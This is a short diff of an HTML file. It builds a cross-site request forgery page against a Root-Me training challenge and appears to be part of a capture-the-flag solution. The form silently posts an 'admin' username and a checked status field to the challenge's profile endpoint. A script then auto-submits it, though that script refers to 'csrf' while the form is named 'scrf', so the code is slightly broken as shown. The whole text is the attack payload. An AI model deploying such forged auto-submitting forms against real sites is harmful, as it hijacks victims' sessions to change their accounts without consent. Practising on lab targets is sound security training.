@@ -1,9 +1,8 @@
 <form name="scrf" method="post" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile">
-		<div>
 		<input type="text" name="username" value="admin">
-		</div>
-		<br>
-		<button type="submit">Sign in</button>
+		<input type="checkbox" name="status" checked=checked>
+		<button type="submit">submit</button>
+		<input type="submit" value="Submit request" />
 </form>
 <script>
 	document.csrf.submit()
